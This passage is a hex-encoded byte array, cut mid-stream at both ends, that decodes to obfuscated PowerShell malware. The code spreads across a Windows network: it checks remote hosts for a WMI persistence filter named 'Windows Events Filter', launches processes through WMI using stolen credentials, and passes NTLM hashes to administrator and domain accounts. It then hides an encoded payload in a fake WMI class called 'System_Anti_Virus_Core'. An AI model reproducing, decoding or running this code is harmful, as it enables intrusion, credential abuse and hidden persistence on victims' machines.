,'d','a' ,20, 20,20,20 , 20 , 20 ,20,20, 20 ,20, 20,20 , 20,20,20 , 20 ,24 ,70,73, '3d' , '5b', 73 ,74 , 72, 69 ,'6e' , 67,'5d' ,28, 67 , 60 , 45 ,54,'2d', 60 ,77,'6d',49,'4f', 42, '4a' , 45, 63 , 54, 20, '2d', '4e' ,61 , '6d', 65, 73,70, 61, 63, 65, 20 , 72,'6f', '6f' , 74 ,'5c',53, 75,62,73 ,63,72 , 69 , 70 ,74, 69 ,'6f' ,'6e' ,20, '2d',43 , '6c' ,61 ,73 , 73, 20,'5f' , '5f',46 , 69,'6c' ,74,65, 72, 54 ,'6f', 43,'6f' , '6e' , 73, 75 ,'6d', 65 ,72 ,42,69,'6e' , 64,69, '6e', 67,20, '2d',43,72,65, 64 , 65 ,'6e' , 74,69,61, '6c',20 , 24 , 63, 72,65 ,64, 20 ,'2d', 63 ,'6f' , '6d', 70, 75 ,74, 65,72, '6e', 61 ,'6d' ,65 ,20 , 24, 49,50 ,20, 29 ,'d', 'a', 20,20 , 20, 20,20 ,20, 20 ,20 ,20 ,20, 20 , 20 , 20, 20 , 20 , 20,69 ,66 ,28 ,24,70 ,73 ,20, '2d','6e' , 65 ,20 ,24 ,'6e' , 75 , '6c' ,'6c',20 , '2d' , 61 , '6e', 64,20 ,24 ,70,73 , '2e',63,'6f', '6e' ,74, 61, 69 , '6e', 73, 28 , 28, 27, 57, 69 ,'6e' , 64,27,'2b',27, '6f', 77 ,73, 20,45,76 , 27, '2b' , 27 ,65, 27 ,'2b', 27,'6e', 74,73,20 ,27,'2b' , 27,46 , 69 ,'6c' ,74 ,65 , 27 , '2b',27,72 ,27, 29 , 29 , 29, 'd','a' ,20 , 20 ,20, 20 , 20,20, 20,20, 20, 20 ,20 , 20, 20 , 20, 20 ,20 ,'7b', 20, 20 ,72 , 65 ,74, 75,72 ,'6e' ,20, 31,20 ,'7d' , 'd' ,'a' ,20, 20 ,20 , 20,20,20, 20 ,20,20 , 20 ,20, 20,20,20 ,20 , 20 ,69, 66,28 ,24 , 70,73 , 20,'2d', '6e' ,65 ,20, 24,'6e' ,75,'6c' ,'6c', 20 , '2d' ,61,'6e' , 64 , 20 , 21,24 ,70, 73 , '2e' ,63,'6f','6e',74 , 61 ,69,'6e' ,73 ,28 , 28 , 27, 57 , 69, '6e',27 ,'2b',27 ,64 , '6f', 77,73,20, 45, 76 , 65 ,'6e' , 27 ,'2b' ,27 ,74 , 73, 27 ,'2b' ,27 , 20 ,46 ,69,27 , '2b',27 , '6c',74 ,27,'2b', 27,65 , 72, 27 ,29,29,29, 'd' , 'a',20,20 , 20 , 20 ,20 ,20, 20 ,20 , 20,20,20 ,20 ,20 ,20 ,20 , 20, '7b' ,'d', 'a' ,'d' ,'a' , 20 , 20, 20 ,20 , 20, 20 , 20 ,20 , 20 , 20 ,20 , 20, 20, 20,20 , 20 , 20 ,20, 20 ,20, 24,72 ,65 ,'3d',49, '4e' ,60 , 56 ,'4f' ,60 , '4b' ,65 ,'2d' ,77,60,'4d', 49 , '6d' ,45,74,48,'4f', 64,20, '2d' ,63,'6c' , 61, 73 , 73 ,20 , 77 , 69, '6e' , 33,32, '5f' ,70,72 , '6f', 63, 65 , 73,73 ,20 ,'2d', '6e' ,61, '6d', 65 , 20, 63,72,65 ,61, 74, 65 ,20, '2d' , 41,72 ,67, 75 , '6d',65 , '6e',74 ,'6c',69, 73, 74 , 20 , 24, 63 , '6d' , 64 ,20, '2d' ,43,72, 65 ,64 ,65 , '6e', 74, 69 ,61 ,'6c', 20 , 24, 63, 72 , 65, 64, 20 ,'2d', 43,'6f' , '6d' ,70 ,75,74,65, 72 ,'6e',61 , '6d' ,65 ,20, 24 ,49 , 50 ,'d', 'a' , 20 ,20, 20 ,20 , 20 ,20, 20, 20 , 20, 20, 20,20 ,20, 20 , 20 ,20, 20, 20,20, 20 ,69, 66 ,20,28,24, 72,65 ,20, '2d','6e', 65,20, 24 ,'6e',75 , '6c' , '6c',20,'2d', 61, '6e',64 ,20, 24, 72 , 65 , '2e' , 72,65 ,74, 75,72 ,'6e' ,76, 61 ,'6c' , 75 ,65 ,20 ,'2d' ,65 ,71,20,30,20 ,29 , 'd' , 'a',20 , 20 , 20,20, 20 ,20, 20,20, 20,20,20 , 20 ,20 ,20,20 ,20 , 20 ,20 , 20,20 , '7b' , 72 , 65 ,74,75, 72,'6e',20,31 ,'7d', 'd' ,'a' ,20 ,20, 20,20 , 20,20 ,20, 20,20 , 20 ,20 ,20, 20 ,20, 20,20 ,'7d' , 'd','a', 'd','a',20, 20 , 20 , 20, 20 ,20,20 , 20 ,20,20,20 , 20,20,20,20 , 20 , 24 ,75,73 ,65, 72 , '6e', 61 ,'6d' , 65 ,'3d' , 24 ,64,'6f' , '6d',61, 69,'6e','2b',22, '5c' , 22 ,'2b',24 ,75 ,73,65 , 72,'d' ,'a' ,20 , 20 ,20 , 20,20 , 20 ,20,20 , 20,20, 20,20 ,20, 20 ,20, 20,24 ,63 ,72 ,65 ,64 ,20 ,'3d' ,20 , '4e' , 60,45 ,60, 57, '2d' ,'6f' , 60 , 42, '4a' ,45,43,74, 20, '2d',54 ,79 , 70,65, '6e' ,61 , '6d',65,20, 53 ,79 ,73 , 74 ,65 ,'6d','2e' , '4d' ,61,'6e' , 61,67,65, '6d' , 65, '6e' , 74,'2e' , 41 ,75 ,74, '6f', '6d' , 61 ,74, 69, '6f','6e','2e' , 50 , 53 , 43, 72 ,65 , 64,65, '6e' ,74 , 69 ,61,'6c', 20, '2d' ,61 , 72 , 67, 75 ,'6d' , 65 ,'6e', 74,'6c' ,69 , 73 , 74 ,20, 24 , 75, 73 ,65, 72, '6e' ,61,'6d' , 65,'2c' ,24 , 70, 61, 73,73 ,77,'6f',72 , 64, 'd' , 'a' , 20 , 20,20, 20, 20 , 20 ,20, 20,20 ,20 , 20, 20 , 20 ,20 , 20 , 20 ,24 ,70 ,73 , '3d' ,'5b',73 ,74 , 72 , 69 ,'6e', 67 , '5d' ,28, 67 ,60 , 45 ,74, 60 , '2d' ,60, 57,'6d' , 60,69,'4f' , 42, '4a',65, 63 , 74 ,20 ,'2d' , '4e', 61 , '6d' ,65, 73,70, 61 ,63 , 65, 20, 72,'6f' , '6f',74, '5c' ,53,75 , 62,73 , 63,72 ,69,70 , 74,69,'6f','6e', 20 , '2d',43, '6c', 61, 73, 73 , 20, '5f' , '5f' , 46, 69, '6c', 74 ,65 ,72 , 54,'6f' , 43, '6f' , '6e' ,73,75,'6d',65 , 72,42, 69 , '6e',64,69 ,'6e' , 67,20, '2d' ,43 , 72,65 , 64,65 , '6e' ,74 ,69 , 61,'6c',20 , 24,63 ,72,65,64, 20,'2d' , 63,'6f' ,'6d' ,70 ,75 , 74, 65, 72,'6e' ,61,'6d' ,65,20, 24, 49 ,50, 20,29 , 'd','a' ,20 , 20,20,20,20 , 20 , 20, 20 , 20 , 20, 20 , 20, 20 ,20, 20 ,20 ,69, 66,28 ,24,70 , 73, 20 ,'2d' ,'6e' ,65,20 ,24 ,'6e' , 75 ,'6c' , '6c',20 ,'2d' ,61,'6e', 64, 20 , 24 , 70, 73,'2e',63, '6f','6e', 74 , 61, 69 ,'6e', 73, 28, 28 ,27 , 57 , 69 , '6e', 64,'6f' , 27, '2b' , 27 ,77,73, 20 , 45 , 76,65 ,'6e' , 74 , 27,'2b',27, 73 , 27 , '2b' ,27, 20,46 ,69 ,27 ,'2b', 27 ,'6c',74, 65,72,27 , 29, 29, 29 ,'d','a',20 , 20 , 20 ,20 , 20 ,20, 20,20 ,20,20,20 , 20,20,20,20 , 20 , '7b',20 ,20, 72, 65 ,74 , 75 , 72, '6e',20 , 31,20, '7d' , 'd' , 'a', 20,20 ,20 , 20, 20, 20 , 20 , 20 ,20 ,20, 20, 20, 20 ,20, 20, 20, 69,66 , 28,24 , 70,73 ,20,'2d' , '6e' ,65 ,20,24 ,'6e',75 , '6c','6c',20 ,'2d' , 61 ,'6e', 64,20 ,21 ,24,70, 73 ,'2e',63 ,'6f' , '6e' , 74, 61, 69, '6e' , 73, 28, 28, 27, 57, 69,27,'2b',27 , '6e',64 ,'6f', 77, 27, '2b' ,27,73,20, 45,76 , 27, '2b' , 27 ,65 , '6e' ,74 ,73 , 27 , '2b', 27, 20 , 27, '2b',27 ,46,69 ,'6c', 74, 65, 72,27 , 29 , 29 , 29, 'd', 'a', 20 , 20,20 ,20, 20, 20, 20, 20 ,20, 20 ,20 ,20 , 20,20 , 20, 20 , '7b' ,'d' , 'a' , 20 , 20 , 20 , 20 , 20 , 20,20 , 20 , 20,20, 20 , 20, 20 ,20 , 20 ,20,20, 20 ,20, 20, 24,72,65 , '3d' , 49 , 60 , '4e' ,60, 56 ,'4f','6b' ,65 ,'2d',77, '6d' , 49 ,'6d', 60 ,65 , 60,54 , 68,'4f', 44,20 , '2d', 63 ,'6c', 61 ,73,73,20, 77, 69 ,'6e', 33 , 32 , '5f' ,70,72 ,'6f', 63, 65 , 73, 73 , 20 ,'2d', '6e', 61, '6d' ,65,20,63, 72, 65 , 61, 74 , 65,20, '2d',41, 72, 67, 75 , '6d' ,65 ,'6e' , 74 , '6c',69, 73, 74 , 20, 24, 63 ,'6d' , 64, 20,'2d' ,43 , 72 , 65,64,65 , '6e', 74 , 69,61,'6c',20, 24 , 63 , 72 , 65,64, 20 ,'2d' , 43 , '6f' ,'6d' ,70 ,75,74 ,65 , 72,'6e', 61,'6d',65, 20,24 , 49 ,50, 'd' , 'a' , 20, 20 , 20 ,20,20, 20, 20 , 20, 20 , 20 ,20 ,20, 20 ,20, 20 ,20 , 20 , 20, 20 ,20 ,69, 66 , 20 , 28 , 24, 72 , 65,20, '2d', '6e' ,65,20,24 ,'6e', 75,'6c' , '6c' , 20 , '2d' , 61 ,'6e' ,64, 20 ,24 , 72, 65 ,'2e', 72 ,65,74, 75, 72, '6e' ,76 , 61 ,'6c', 75,65,20 ,'2d',65 , 71 ,20, 30 ,20,29 , 'd','a' , 20, 20 ,20 ,20, 20, 20 , 20 , 20,20 , 20 , 20, 20,20,20,20 ,20 ,20 , 20,20, 20 , '7b',72, 65,74 , 75,72 ,'6e' ,20 ,31 ,'7d','d', 'a' , 20, 20,20 ,20,20 ,20 , 20 , 20 ,20 , 20, 20, 20 , 20 , 20,20, 20 ,'7d','d', 'a' ,20 ,20 , 20 ,20,20 , 20,20,20, 20,20 , 20,20 ,20, 20,20 ,20 ,69 , 66,20 ,28 ,24,75 , 73, 65 , 72 ,20 , '2d', '6e', 65 , 20,28 , 27 ,61, 64 , '6d' ,69,27 ,'2b' ,27 , '6e' ,69,73, 74,72, 61 ,27 ,'2b' ,27 ,74 , '6f' , 72, 27 ,29,29 ,'d','a', 20,20 , 20,20,20, 20,20 ,20 ,20 ,20, 20, 20, 20, 20, 20, 20, '7b', 'd' , 'a' ,20,20, 20 , 20 ,20,20,20, 20, 20 , 20,20,20 , 20,20, 20,20 , 20 , 20,20 , 20 ,24 ,63,72 , 65 ,64 , 20 ,'3d' ,20, '6e' ,65,60 , 77 , '2d' , '4f' ,62,'4a' , 45, 60,63, 74 , 20,'2d',54 , 79 ,70,65 , '6e', 61 ,'6d', 65, 20, 53 ,79 ,73 , 74, 65,'6d' , '2e','4d' , 61 ,'6e' ,61, 67,65, '6d',65 ,'6e', 74,'2e' , 41, 75 ,74 , '6f','6d' ,61 , 74, 69, '6f' , '6e' , '2e', 50,53 ,43, 72 , 65,64, 65 ,'6e', 74 , 69 ,61, '6c',20,'2d' ,61 , 72, 67 ,75 ,'6d',65,'6e',74,'6c' ,69 ,73, 74,20 ,28,27,61 ,27,'2b', 27 ,64,'6d' ,27 ,'2b',27 ,69, '6e' , 69, 73,74 ,72 , 27 , '2b' ,27,61 , 74 ,'6f' , 27, '2b' , 27 , 72,27, 29 ,'2c' , 24 , 70, 61, 73,73 ,77 ,'6f' , 72 ,64, 'd' , 'a', 20,20, 20 , 20, 20 , 20 , 20 , 20 ,20 , 20,20 , 20 ,20 ,20,20 ,20, 20 ,20, 20, 20 ,24 , 70 , 73, '3d' , '5b' , 73,74,72, 69,'6e',67 ,'5d', 28 ,47,60,45,74 ,60 , '2d' ,57,'6d' ,60 ,49 ,60,'4f' , 62, '4a' ,45,63,54,20 ,'2d' , '4e' , 61,'6d' , 65,73 ,70, 61, 63,65,20, 72 ,'6f' ,'6f' , 74 ,'5c' ,53 ,75, 62,73,63, 72,69 ,70 ,74 ,69,'6f' , '6e',20,'2d',43, '6c' ,61, 73 ,73 , 20,'5f','5f' , 46, 69 , '6c', 74 , 65 , 72,54 ,'6f' ,43 , '6f','6e', 73, 75 , '6d' , 65, 72, 42 , 69,'6e' , 64 , 69, '6e' , 67,20 ,'2d' , 43, 72 ,65, 64, 65 , '6e',74 ,69, 61 ,'6c',20 ,24 , 63 , 72,65 , 64 , 20,'2d' ,63 , '6f' , '6d' ,70 , 75,74 ,65, 72, '6e',61,'6d',65,20,24, 49 , 50 , 20,29 ,'d','a' ,20 , 20,20,20 ,20 , 20 , 20 ,20 , 20,20,20 , 20, 20 ,20, 20 , 20,20 , 20 ,20 , 20 , 69,66,28 ,24 , 70 ,73 ,20 , '2d' ,'6e' ,65 , 20 , 24,'6e' ,75, '6c' , '6c',20 ,'2d',61,'6e' ,64 , 20, 24 , 70 , 73 , '2e',63, '6f' ,'6e' , 74 , 61,69, '6e' ,73 , 28 , 28 , 27, 57,27, '2b' , 27 ,69 ,'6e' ,64,'6f',77, 73,20, 45,76 , 27, '2b', 27 ,65 , '6e', 74 , 73 , 27 , '2b' , 27,20 , 46 , 69 ,27, '2b', 27 , '6c',74, 65 ,72 , 27 ,29 , 29,29 , 'd' , 'a',20, 20 , 20 , 20 ,20, 20 ,20, 20,20, 20,20 ,20 , 20 ,20 , 20,20, 20 ,20 , 20 ,20 , '7b' ,20 , 20 ,72 , 65 ,74 ,75 , 72, '6e',20 ,31,20,'7d' ,'d','a' ,20, 20, 20, 20,20 ,20 ,20 , 20, 20,20,20,20,20, 20,20, 20 ,20 , 20,20,20 , 69 ,66 , 28, 24 , 70,73 ,20 , '2d' ,'6e',65 ,20, 24, '6e', 75, '6c','6c',20, '2d' ,61 , '6e',64 ,20, 21 , 24 , 70,73,'2e' ,63,'6f', '6e' , 74 , 61,69 , '6e' , 73 ,28,28,27 , 57, 69,'6e', 64, '6f',77 , 27,'2b',27 , 73,20 , 45,76 ,27,'2b' ,27 ,65 , '6e', 27, '2b' , 27 ,74,73 ,20, 46, 27,'2b', 27, 69 ,'6c' , 74,27, '2b',27 , 65 , 72 ,27,29, 29, 29,'d' , 'a' , 20 , 20 ,20 ,20 ,20,20,20 , 20 , 20 ,20, 20, 20 ,20 ,20, 20, 20,20 ,20 ,20 , 20,'7b' ,'d','a' ,20,20 , 20 ,20 , 20 ,20 , 20, 20 , 20, 20,20, 20,20, 20, 20 ,20 ,20 ,20 , 20,20,20, 20, 20, 20 ,24 , 72,65 , '3d' ,69 ,60,'4e', 76,'6f', '4b', 65 , 60 ,'2d' ,60 ,57,'6d' ,60,69,'6d',45 ,54, 68,'4f' , 64 ,20 ,'2d',63,'6c' , 61,73 ,73 , 20 ,77,69 , '6e' ,33, 32, '5f',70,72 ,'6f', 63 , 65,73, 73 ,20, '2d' , '6e',61 ,'6d' , 65, 20, 63, 72 ,65, 61, 74, 65, 20 , '2d' , 41,72, 67, 75, '6d',65,'6e' , 74, '6c',69,73 ,74 , 20, 24 ,63 , '6d' , 64 ,20 , '2d' ,43 ,72 , 65,64 ,65 ,'6e',74,69,61 , '6c', 20 ,24 , 63 , 72,65,64, 20, '2d' ,43, '6f', '6d' ,70, 75,74 ,65, 72 , '6e' , 61 , '6d', 65,20,24 , 49,50 , 'd' , 'a', 20, 20 ,20,20,20 ,20 , 20 ,20,20,20,20 ,20,20 , 20, 20 , 20 ,20 ,20, 20 ,20,20, 20 , 20, 20 , 69 , 66 ,20 ,28,24, 72 ,65, 20 , '2d' ,'6e' , 65,20,24 , '6e' ,75,'6c' ,'6c',20 , '2d' , 61, '6e',64,20 ,24, 72, 65,'2e' , 72 ,65,74 , 75,72 ,'6e' ,76 ,61,'6c', 75,65 ,20,'2d' , 65 ,71,20 ,30,20, 29, 'd' , 'a', 20 ,20,20, 20 , 20 , 20, 20,20 ,20,20 , 20,20, 20 ,20 ,20 ,20 , 20, 20 ,20, 20 , 20,20 ,20 , 20,'7b' ,72 , 65 , 74 ,75 , 72,'6e',20 , 31,'7d', 'd','a', 20 ,20, 20, 20, 20, 20 ,20, 20,20 , 20, 20 ,20, 20 , 20, 20 ,20 , 20,20,20, 20, '7d','d', 'a' , 20 ,20 , 20,20 , 20 , 20,20 , 20 , 20,20,20,20, 20, 20 ,20, 20,'7d' ,'d', 'a' ,20,20, 20,20, 20, 20 , 20,20 , 20 , 20, 20 ,20 ,'7d' ,'d' ,'a',20 , 20 , 20 ,20, 20, 20 , 20, 20 ,20 , 20,20 ,20 , 65,'6c', 73 ,65 ,'d', 'a' ,20 ,20 ,20,20,20 ,20,20 ,20 , 20 ,20,20 ,20, '7b' ,'d' , 'a' ,20,20 , 20 , 20 ,20,20,20 , 20 , 20 , 20 ,20, 20, 20,20 , 20, 20 ,24 , '6e', 74,'6c' ,'6d' , 68 , 61,73 ,68 , '3d' , 24,70 ,61, 73 , 73, 77, 64 , 'd' ,'a', 9,9, 9,9 ,24,63 ,'6d' ,64,'6e' ,74 , '6c' ,'6d',20 , '3d', 24 , 63 ,'6d' ,64,'d' , 'a' ,9 ,9 ,9, 9,24,72, 65,'3d' ,69,'6e' ,60 , 56 , '4f' , 60, '4b', 65 , '2d' , 60 ,77, '6d' , 69 , 65,60 , 58 , 45 , 63,20,'2d' ,54 , 61,72 ,67 ,65 ,74 , 20, 24 ,69,70,20, '2d', 55, 73, 65, 72, '6e' , 61 , '6d', 65, 20,24 ,75,73 , 65 , 72 , 20 , '2d' ,48 ,61, 73, 68, 20 , 24, '6e', 74,'6c' ,'6d', 68,61 , 73 , 68, 'd', 'a',20 ,20 , 20 , 20 , 20, 20,20,20 ,20 , 20, 20 ,20,20, 20 , 20,20 , 69 ,66, 20 , 28 ,24, 72,65, '2e' ,63 ,'6f','6e' , 74 , 61 , 69, '6e' , 73 , 28, 28, 27 ,61,63, 63 , 65 ,73 , 73, 27,'2b' , 27, 65 ,27 ,'2b' , 27, 64,27 , '2b', 27 , 20,57, '4d', 49 , 27 , 29 ,29 ,29, 'd' ,'a' ,20,20, 20,20 ,20,20,20, 20, 20,20 , 20 , 20,20,20 ,20,20 , '7b' , 'd', 'a',20,20 ,20, 20 , 20, 20, 20,20, 20 ,20, 20 , 20, 20 ,20,20,20 ,20,20, 20,20,24 , 72,65, '3d' , 69, '4e' , 76,'6f' ,'4b' , 65 , 60 , '2d' , 57,60,'4d',69 , 45,60 , 58 ,45, 43, 20 , '2d',54 ,61, 72 , 67 ,65 , 74 ,20 , 24 , 69, 70,20 ,'2d',55, 73 , 65,72 ,'6e', 61 , '6d' , 65 ,20,24 , 75, 73,65 , 72 ,20,'2d',48, 61, 73 , 68, 20, 24, '6e', 74,'6c','6d' ,68,61, 73, 68, 20,'2d' , 63, '6f' ,'6d' , '6d' ,61, '6e' ,64 , 20 ,24 ,63,'6d' ,64 , '6e', 74 , '6c' ,'6d','d','a' ,20, 20,20 , 20,20 , 20 , 20, 20, 20 ,20, 20, 20, 20, 20,20 ,20,20 , 20 , 20 , 20, 69 , 66,20, 28, 24 ,72, 65 , 20,'2d' , '6e',65 , 20,24,'6e',75 , '6c' , '6c', 20,'2d',61, '6e' ,64,20 , 24 , 72 , 65,'2e' ,63,'6f' ,'6e',74 ,61,69 , '6e',73 , 28, 28 ,27 ,43, 27 , '2b', 27, '6f' , '6d' ,'6d' ,61, '6e', 64, 20 ,65 , 27, '2b' , 27 , 78 , 65 , 63 ,75,27 , '2b' , 27,74 ,65,27 , '2b' , 27, 64 , 20, 77,27 , '2b' , 27 , 69 , 74 , 68 ,20, 70, 27 , '2b' ,27, 72, '6f', 63, 65,73 , 73, 27 ,29 , 29,29,'d','a', 20 ,20 ,20, 20 , 20 ,20,20 , 20,20,20 , 20,20 , 20,20 , 20 ,20, 20,20, 20 , 20 ,'7b', 72 , 65,74 , 75,72, '6e',20,31,'7d', 'd', 'a', 20,20,20 ,20 ,20 , 20, 20, 20,20, 20,20 ,20, 20,20, 20 , 20,'7d', 'd', 'a' , 'd' , 'a' ,20, 20, 20, 20 , 20 ,20,20 , 20, 20 , 20 ,20 , 20 , 20, 20,20, 20, 24 ,72 , 65 ,'3d',69 ,'4e' , 56,'4f' ,'4b',65, 60 , '2d' , 60, 77 ,'6d', 60 , 69 , 65, 78 , 60 , 45, 63 ,20 ,'2d', 54 , 61 , 72 , 67, 65 , 74, 20 ,24,69, 70 ,20,'2d' , 64 ,'6f','6d', 61, 69,'6e' ,20, 24,64,'6f' ,'6d' ,61 ,69, '6e',20, '2d',55, 73, 65, 72, '6e', 61,'6d' , 65 ,20 , 24, 75 ,73,65, 72, 20 , '2d',48,61,73, 68 ,20 ,24,'6e',74 , '6c' ,'6d' , 68,61 ,73,68 , 'd' , 'a' , 20, 20,20 , 20,20, 20,20, 20 , 20,20, 20,20 , 20, 20, 20, 20 ,69, 66, 20, 28,24,72,65, '2e' , 63, '6f', '6e',74,61 , 69, '6e' ,73,28 ,28 ,27, 61 , 63 , 63, 65, 73, 73 ,65,64,20,57, 27, '2b', 27, '4d',27,'2b', 27 , 49, 27, 29, 29 ,29 , 'd', 'a',20, 20, 20 ,20 , 20 , 20 ,20 ,20 , 20,20, 20 , 20 ,20 , 20 ,20 , 20 ,'7b','d' ,'a', 20, 20, 20,20, 20 , 20 , 20 ,20 ,20 ,20, 20 , 20,20, 20,20, 20,20,20,20,20, 24 ,72 , 65 ,'3d' , 49, '4e',60,56 ,60 , '4f',60 ,'6b' ,45 , '2d' , 57, '4d',69,45 ,58,45 , 43 ,20 , '2d',54 , 61 , 72,67, 65 ,74 , 20,24 ,69 , 70 , 20, '2d' ,64 , '6f', '6d' , 61,69,'6e', 20, 24 ,64,'6f', '6d',61,69 ,'6e' ,20, '2d' , 55 ,73,65, 72,'6e' , 61,'6d', 65,20 ,24, 75, 73 ,65 ,72,20 , '2d', 48 ,61 ,73 ,68 , 20,24,'6e', 74,'6c', '6d', 68 , 61,73 ,68 , 20 , '2d' ,63 ,'6f' , '6d' ,'6d', 61, '6e' , 64 , 20 ,24 ,63 ,'6d', 64,'6e',74, '6c' , '6d','d' , 'a',20 ,20, 20, 20, 20 , 20, 20 , 20 , 20 , 20 ,20, 20, 20 ,20, 20, 20, 20 ,20 ,20, 20 ,69, 66 , 20 , 28 , 24 ,72,65 , 20 , '2d' , '6e',65 ,20, 24 ,'6e',75,'6c', '6c' , 20 , '2d',61,'6e' ,64,20 , 24 , 72,65,'2e',63,'6f' , '6e',74, 61,69,'6e', 73, 28,28, 27 ,43,'6f' ,'6d' ,'6d',61,'6e' ,64 ,27,'2b' ,27, 20 ,65, 78, 65 , 63 , 75,74 , 65 ,64,20, 77, 69 , 27,'2b' , 27,74 ,68 , 20,27 ,'2b' ,27, 70 , 72 ,27 , '2b' , 27 ,'6f' ,63 ,27 ,'2b' ,27,65 , 73 ,27 , '2b' , 27 ,73, 27, 29,29, 29 , 'd' , 'a', 20,20 ,20,20 , 20 , 20,20 ,20,20 , 20 ,20,20, 20 , 20 , 20,20,20, 20 ,20 , 20 ,'7b', 72 ,65,74,75 ,72, '6e',20 , 31 ,'7d','d' ,'a' , 20 ,20,20, 20 , 20 , 20, 20, 20,20,20,20 , 20,20,20,20 ,20, '7d','d' , 'a' ,20 ,20, 20 , 20 ,20 , 20 , 20,20, 20 , 20 , 20 ,20 , 20 ,20,20 , 20 ,69, 66, 20,28,24 ,75 , 73 , 65 ,72, 20 , '2d' , '6e',65 ,20, 28 ,27, 61,64,27, '2b' , 27 ,'6d' , 69 ,27, '2b' , 27 , '6e',69, 73 , 74, 27 , '2b' , 27, 72 ,61 ,74 , '6f' ,72,27, 29 ,29 , 'd', 'a' ,20,20, 20, 20 ,20 , 20,20, 20, 20 ,20 , 20 ,20 ,20, 20,20,20,'7b','d','a' , 20 , 20 , 20 , 20, 20, 20 ,20 , 20 , 20, 20 ,20 , 20, 20 , 20 , 20 ,20,20 , 20 ,20 , 20,24, 72,65, '3d' , 49, '6e',56 ,60,'6f', '6b' ,65 , '2d' ,77 ,'6d' , 60, 69 , 45, 60 ,58 ,65,63, 20,'2d' , 54,61 ,72,67, 65 ,74 ,20 ,24 , 69, 70, 20, '2d', 55 , 73 ,65,72,'6e' , 61 ,'6d', 65 , 20,28 ,27,61, 27, '2b', 27,64, '6d',69,'6e' ,69 , 73,74,72,61 , 74,27 ,'2b',27, '6f' ,72, 27 , 29, 20, '2d',48,61,73, 68 , 20 , 24 ,'6e', 74 ,'6c' ,'6d',68, 61 , 73 , 68 , 'd', 'a',20 , 20,20 ,20,20 , 20 , 20 , 20,20 , 20 ,20, 20 , 20 ,20 , 20 ,20,20, 20,20 ,20 , 69 , 66 ,20 , 28 ,24,72 ,65,'2e', 63,'6f' ,'6e', 74 ,61 , 69, '6e' ,73,28 , 28,27, 61 ,63, 63 , 65 ,27 ,'2b' ,27,73,27, '2b' , 27,73,65, 27, '2b',27,64 ,20 ,57 ,'4d' ,49 ,27 ,29, 29, 29, 'd' ,'a' , 20,20 , 20,20 , 20 , 20, 20 , 20 , 20 , 20 ,20 ,20, 20, 20 ,20, 20 ,20 , 20, 20, 20 ,'7b', 'd','a' , 20 ,20,20 ,20, 20 , 20, 20, 20, 20 ,20 , 20, 20,20, 20,20 , 20, 20,20 , 20, 20,20, 20, 20,20 , 24 ,72, 65, '3d',69 , '4e',60 ,56, '6f' , '4b', 45, '2d', 77, 60,'4d' ,60,49 ,45 ,58, 65,43, 20 ,'2d', 54,61 ,72 ,67, 65, 74 ,20,24 ,69,70 ,20, '2d', 55,73,65 , 72 , '6e' , 61 ,'6d' , 65, 20 , 28,27,61,64,27 ,'2b' , 27 , '6d', 69 , '6e' ,69 ,27 ,'2b' ,27, 73,27 , '2b' , 27,74 , 72 ,61,74 , '6f',72, 27 ,29, 20 ,'2d' , 48, 61,73, 68 , 20,24 , '6e',74, '6c' , '6d' ,68,61 , 73, 68, 20 ,'2d' ,63,'6f', '6d' , '6d' , 61 , '6e' , 64, 20 ,24 ,63 , '6d',64 ,'6e', 74,'6c' ,'6d','d' ,'a', 20 , 20 , 20, 20,20 , 20, 20,20 ,20 , 20 ,20 ,20, 20 , 20,20 ,20, 20 ,20 ,20 ,20 , 20,20, 20, 20,69,66, 20 , 28 ,24 , 72, 65 , 20, '2d' , '6e' , 65,20 ,24, '6e', 75,'6c' ,'6c' ,20, '2d',61 ,'6e' ,64 ,20, 24 , 72 ,65, '2e', 63, '6f', '6e' , 74 , 61 ,69 ,'6e' , 73, 28, 28 , 27 ,43 ,27 , '2b', 27 , '6f' ,27 , '2b',27, '6d', 27, '2b' ,27, '6d' ,61 ,27,'2b', 27, '6e',64 ,20,65 , 78 , 65 ,63 ,75 ,74, 65 , 64, 20 ,77 ,69 , 74 ,68, 20,70,27, '2b',27 , 72,'6f' , 63,65,27,'2b' ,27 ,73 , 73 ,27 ,29 , 29, 29 ,'d' ,'a', 20 ,20 , 20 ,20, 20,20 ,20, 20 , 20 ,20, 20,20,20,20 ,20 , 20 ,20,20 ,20, 20,20,20 ,20, 20,'7b',72, 65,74 , 75, 72, '6e' , 20, 31 , '7d' , 'd','a',20 ,20,20, 20, 20 , 20 ,20 , 20, 20 , 20, 20,20,20 , 20 ,20 , 20 , 20 , 20 , 20, 20, '7d' ,'d', 'a', 20, 20,20 , 20, 20, 20,20,20,20,20 ,20, 20 , 20,20 ,20 ,20 ,'7d' , 'd','a' , 20 ,20,20 ,20 , 20 ,20, 20, 20, 20, 20,20,20,'7d', 'd' ,'a',20 , 20 , 20 ,20 ,20 ,20 , 20, 20 , '7d' , 20 , 23 , 66 , '6f' , 72 ,65,61,63,68, 'd' , 'a' , 20, 20, 20, 20 ,20,20,20 , 20 , 72,65,74 ,75,72, '6e',20, 30, 'd','a' , 20 , 20, 20 , 20, 20,20 , '7d', 'd' , 'a','7d', 'd', 'a' ,'d' , 'a' ,66 ,75 , '6e',63 ,74,69 , '6f' ,'6e', 20 , 73, 65 ,'6e',74,66 ,69 , '6c', 65 ,28 ,24, 66 ,69,'6c',65 ,70 ,61,74,68,'2c',24,77 ,'6d' ,69 , 70, 61 , 74,68 ,29 , 'd','a' ,'7b','d','a', 20 ,20, 20,20 , 20 ,20,20 , 20 ,24 , 45 ,'6e',63, '6f', 64 , 65 ,64 ,46 , 69, '6c', 65 , 20 , '3d',20 , 28,'5b' ,57,'6d',69, 43 ,'6c', 61,73 , 73 , '5d' ,20, 28 , 28, 27 , 72 , '6f', '6f' , 27, '2b',27,74,27, '2b' , 27,'7b',27,'2b' ,27 ,30 , 27,'2b', 27 ,'7d' ,64, 27 , '2b' ,27, 65,66,61 , 75 ,'6c', 74 , '3a' ,53, 79 , 73 , 74 , 65 , '6d', '5f' ,41 , '6e', 27 , '2b',27 , 74,69, '5f',56,69 , 72 , 75, 73, '5f', 43, '6f' ,72 , 65,27 ,29 ,20 ,'2d' , 66,'5b' , 43 ,48 , 41,52 , '5d', 39 , 32, 29 , 29 , '2e',50, 72 ,'6f' , 70 , 65, 72 ,74 , 69, 65,73,'5b' , 24, 77, '6d' ,69 , 70, 61 ,74, 68 ,'5d','2e' , 56 ,61,'6c' ,75, 65 ,'d' , 'a',20 ,20 , 20,20, 20, 20, 20 ,20 , 24,42, 79 , 74,65 ,73 ,32 ,'3d' ,'5b' , 73,79 ,73, 74, 65 